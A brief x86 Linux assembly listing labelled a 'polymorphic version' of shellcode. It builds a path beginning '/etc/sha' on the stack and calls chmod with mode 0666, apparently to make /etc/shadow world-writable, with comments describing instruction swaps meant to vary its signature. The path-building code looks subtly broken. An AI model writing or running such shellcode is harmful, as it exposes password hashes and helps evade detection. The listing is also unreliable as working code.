Polymorphic version

  section .text
       global _start
  _start:
       xor ecx, ecx
       mov al,15   ; changed push pop to mov
       push ecx
       push byte 0x77
       push cx
       push 0x6168732f
       push 0x6374652f
       mov ebx, esp
       mov ecx,0x1b6 ; changed pop ,to mov
       int 0x80
       mov al,1  ; changed push pop to mov

       int 0x80